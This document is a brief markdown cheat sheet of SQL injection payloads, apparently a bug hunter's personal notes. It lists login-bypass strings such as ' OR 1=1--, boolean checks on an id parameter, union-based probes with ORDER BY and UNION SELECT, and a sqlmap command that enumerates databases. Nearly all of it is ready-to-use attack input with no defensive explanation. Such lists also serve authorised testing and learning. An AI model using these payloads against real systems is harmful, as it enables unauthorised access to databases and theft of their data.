# SQL Injection - HackerMadhan2406 Notes
> From Trichy to $ Bounty 💰

## 1. Basic Payloads
' OR '1'='1
' OR 1=1--
" OR "1"="1

## 2. Check Vulnerability
?id=1'
?id=1 AND 1=1
?id=1 AND 1=2

## 3. Union Based
ORDER BY 1-- 
-1 UNION SELECT 1,2,3--

## 4. Tools
sqlmap -u URL --dbs
